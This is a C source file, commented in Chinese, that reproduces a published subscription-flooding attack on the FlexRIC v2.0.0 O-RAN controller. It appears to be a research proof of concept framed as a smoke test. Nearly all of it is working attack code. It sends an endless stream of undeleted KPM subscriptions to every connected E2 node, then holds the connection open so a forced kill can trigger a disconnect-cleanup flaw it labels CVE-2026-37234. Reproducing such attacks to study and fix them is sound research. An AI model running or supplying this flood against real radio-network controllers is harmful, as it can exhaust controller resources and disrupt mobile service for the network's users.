/*
 * xapp_flood.c — Klement et al. (EuroS&P'25) "Endless Subscriptions"
 * LoopSub_Req 攻击在 FlexRIC v2.0.0 上的最小复现（smoke test）。
 *
 * 论文 Algorithm 1: 把标准 KPM 订阅包进 while(true) 死循环，
 * 每轮对每个 E2 节点发一笔订阅（KPM ran_func=2, period=100ms），不删除。
 *
 * 用法: xapp_flood [n_iters] [delay_us]
 *   n_iters: 订阅轮数（0 或缺省 = 无限循环）
 *   delay_us: 每轮间隔微秒（缺省 0 = 全速洪泛）
 * 到达 n_iters 后挂住 sleep，便于外部 kill -9 复现 CVE-2026-37234 断连残留。
 */
#include "../../../../src/xApp/e42_xapp_api.h"
#include "../../../../src/util/alg_ds/alg/defer.h"
#include "../../../../src/util/time_now_us.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

static
kpm_event_trigger_def_t gen_ev_trig(uint64_t period)
{
  kpm_event_trigger_def_t dst = {0};
  dst.type = FORMAT_1_RIC_EVENT_TRIGGER;
  dst.kpm_ric_event_trigger_format_1.report_period_ms = period;
  return dst;
}

static
meas_info_format_1_lst_t gen_meas_info_format_1_lst(const char* action)
{
  meas_info_format_1_lst_t dst = {0};
  dst.meas_type.type = NAME_MEAS_TYPE;
  dst.meas_type.name = cp_str_to_ba(action);
  dst.label_info_lst_len = 1;
  dst.label_info_lst = calloc(1, sizeof(label_info_lst_t));
  assert(dst.label_info_lst != NULL && "Memory exhausted");
  dst.label_info_lst[0].noLabel = calloc(1, sizeof(enum_value_e));
  assert(dst.label_info_lst[0].noLabel != NULL && "Memory exhausted");
  *dst.label_info_lst[0].noLabel = TRUE_ENUM_VALUE;
  return dst;
}

static
kpm_act_def_format_1_t gen_act_def_frmt_1(const char** action)
{
  kpm_act_def_format_1_t dst = {0};
  dst.gran_period_ms = 100;
  size_t count = 0;
  while (action[count] != NULL) count++;
  dst.meas_info_lst_len = count;
  dst.meas_info_lst = calloc(count, sizeof(meas_info_format_1_lst_t));
  assert(dst.meas_info_lst != NULL && "Memory exhausted");
  for(size_t i = 0; i < dst.meas_info_lst_len; i++)
    dst.meas_info_lst[i] = gen_meas_info_format_1_lst(action[i]);
  return dst;
}

static
kpm_act_def_t gen_act_def(const char** act)
{
  kpm_act_def_t dst = {0};
  dst.type = FORMAT_1_ACTION_DEFINITION;
  dst.frm_1 = gen_act_def_frmt_1(act);
  return dst;
}

static void sm_cb_kpm(sm_ag_if_rd_t const* rd)
{
  (void)rd; // 攻击者不关心数据
}

volatile sig_atomic_t stop_flag = 0;
static void on_sigint(int sig){ (void)sig; stop_flag = 1; }

int main(int argc, char *argv[])
{
  long n_iters = (argc > 1) ? atol(argv[1]) : 0;      // 0 = 无限
  long delay_us = (argc > 2) ? atol(argv[2]) : 0;

  fr_args_t args = init_fr_args(argc, argv);
  init_xapp_api(&args);
  sleep(1);

  e2_node_arr_t nodes = e2_nodes_xapp_api();
  defer({ free_e2_node_arr(&nodes); });
  assert(nodes.len > 0);
  printf("[flood] Connected E2 nodes = %d\n", nodes.len);

  signal(SIGINT, on_sigint);
  signal(SIGTERM, on_sigint);

  const int KPM_ran_function = 2;
  long iter = 0;
  long sent = 0;
  int64_t t0 = time_now_us();

  while(stop_flag == 0 && (n_iters == 0 || iter < n_iters)){
    for (int i = 0; i < nodes.len; i++) {
      kpm_sub_data_t kpm_sub = {0};
      defer({ free_kpm_sub_data(&kpm_sub); });
      kpm_sub.ev_trg_def = gen_ev_trig(100 /* ms, 论文 Algorithm 1 用 100ms */);
      kpm_sub.sz_ad = 1;
      kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
      assert(kpm_sub.ad != NULL && "Memory exhausted");

      const char *act_gnb[] = {"DRB.RlcSduDelayDl", NULL};
      *kpm_sub.ad = gen_act_def(act_gnb);

      sm_ans_xapp_t h = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub, sm_cb_kpm);
      if(h.success == false){
        printf("[flood] iter %ld: subscription FAILED (RIC 拒绝/失败) sent=%ld\n", iter, sent);
      } else {
        sent++;
      }
    }
    iter++;
    if(iter % 200 == 0){
      int64_t now = time_now_us();
      printf("[flood] iter=%ld sent=%ld elapsed=%.2fs rate=%.1f subs/s\n",
             iter, sent, (now - t0)/1e6, sent/((double)(now - t0)/1e6));
      fflush(stdout);
    }
    if(delay_us > 0) usleep(delay_us);
  }

  printf("[flood] 洪泛阶段结束: iter=%ld sent=%ld elapsed=%.2fs\n",
         iter, sent, (time_now_us()-t0)/1e6);
  fflush(stdout);

  // 挂住连接，供外部 kill -9 复现断连残留（CVE-2026-37234 条件）
  printf("[flood] holding connection (sleep)... 外部 kill -9 可触发断连清理路径\n");
  fflush(stdout);
  while(stop_flag == 0) sleep(1);

  while(try_stop_xapp_api() == false) usleep(1000);
  printf("[flood] exit\n");
  return 0;
}
